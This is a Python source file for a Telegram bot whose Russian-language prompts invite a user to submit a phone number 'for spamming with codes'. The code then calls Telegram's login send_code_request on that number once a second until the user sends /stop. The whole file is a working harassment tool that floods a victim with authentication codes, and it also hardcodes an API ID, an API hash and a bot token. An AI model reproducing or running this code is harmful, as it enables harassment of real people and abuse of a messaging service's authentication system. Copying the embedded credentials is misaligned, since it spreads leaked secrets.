import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient

API_ID = 35911533
API_HASH = "11dafcdc1514796c867055023716d39a"
BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

spam_data = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Пришли номер телефона в формате +7XXXXXXXXXX для спама кодами.")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_data and not spam_data[chat_id]["task"].done():
        spam_data[chat_id]["task"].cancel()
        await spam_data[chat_id]["client"].disconnect()
        del spam_data[chat_id]
        await update.message.reply_text("Спам остановлен.")
    else:
        await update.message.reply_text("Нет активного спама.")

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    chat_id = update.effective_chat.id
    if chat_id in spam_data and not spam_data[chat_id]["task"].done():
        await update.message.reply_text("Уже идет спам для этого чата.")
        return

    client = TelegramClient(None, API_ID, API_HASH)
    await client.connect()

    async def spam():
        count = 0
        try:
            while True:
                await client.send_code_request(phone)
                count += 1
                await context.bot.send_message(chat_id, f"Отправлен код #{count} на номер {phone}")
                await asyncio.sleep(1)
        except asyncio.CancelledError:
            await client.disconnect()
            raise
        except Exception as e:
            await context.bot.send_message(chat_id, f"Ошибка: {e}")
            await client.disconnect()

    task = asyncio.create_task(spam())
    spam_data[chat_id] = {"task": task, "client": client}
    await update.message.reply_text("Запущен спам кодами. Для остановки отправь /stop")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
    app.run_polling()

if __name__ == "__main__":
    main()
